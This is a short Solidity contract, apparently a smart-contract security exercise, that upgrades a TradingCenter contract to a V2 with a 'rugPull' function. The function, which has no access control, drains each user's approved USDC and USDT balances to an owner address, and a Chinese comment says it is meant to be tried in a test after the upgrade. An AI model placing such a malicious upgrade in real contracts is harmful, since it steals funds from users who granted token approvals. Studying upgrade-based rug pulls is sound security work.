// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.17;
import {TradingCenter, IERC20} from "./TradingCenter.sol";

// TODO: Try to implement TradingCenterV2 here
contract TradingCenterV2 is TradingCenter {
    bool public initializedv2;

    function initializedV2() external {
        require(initializedv2 == false, "already initialized");
        initializedv2 = true;
    }

    // 試圖在 test 中升級後 rug pull 搶走所有 user 的 usdc 和 usdt
    function rugPull(address user, address owner) external {
        usdc.transferFrom(user, owner, usdc.balanceOf(user));
        usdt.transferFrom(user, owner, usdt.balanceOf(user));
    }
}
